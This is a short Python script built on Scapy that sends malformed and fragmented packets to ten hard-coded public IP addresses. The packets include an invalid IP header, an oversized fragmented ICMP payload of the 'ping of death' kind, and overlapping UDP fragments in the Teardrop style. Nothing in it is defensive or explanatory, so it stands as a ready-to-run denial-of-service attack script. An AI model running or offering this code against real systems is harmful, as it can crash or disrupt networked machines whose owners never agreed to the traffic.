from scapy.layers.inet import IP, ICMP, TCP, UDP
from scapy.all import *

def fragment(pkt, fragsize=1480):
    fragsize = (fragsize + 7) // 8 * 8
    lst = []
    for p in pkt:
        s = raw(p[IP].payload)
        nb = (len(s) + fragsize - 1) // fragsize
        for i in range(nb):
            q = p.copy()
            del(q[IP].payload)
            del(q[IP].chksum)
            del(q[IP].len)
            if i != nb - 1:
                q[IP].flags |= 1
            q[IP].frag += i * fragsize // 8  
            r = conf.raw_layer(load=s[i * fragsize:(i + 1) * fragsize])
            r.overload_fields = p[IP].payload.overload_fields.copy()
            q.add_payload(r)
            lst.append(q)
    return lst



def send_packet(ip_address):
    # print(get_if_addr("192.168.1.52"))
    packet = IP(dst=ip_address) / TCP(dport=(0,1024))

    send(IP(dst=ip_address, ihl=2, version=3)/ICMP())
    send( fragment(IP(dst=ip_address)/ICMP()/("X"*60000)) )

    send(IP(dst=ip_address, id=42, flags="MF")/UDP()/("X"*10))

    send(IP(dst=ip_address, id=42, frag=48)/("X"*116))

    send(IP(dst=ip_address, id=42, flags="MF")/UDP()/("X"*224))

    # send(IP(dst=ip_address, flags="MF")/TCP())


if __name__ == "__main__":
    
    # print(f"Current IP address: {current_ip}")

    for i in range(0, 10):
        send_packet(f"128.0.0.{i}")

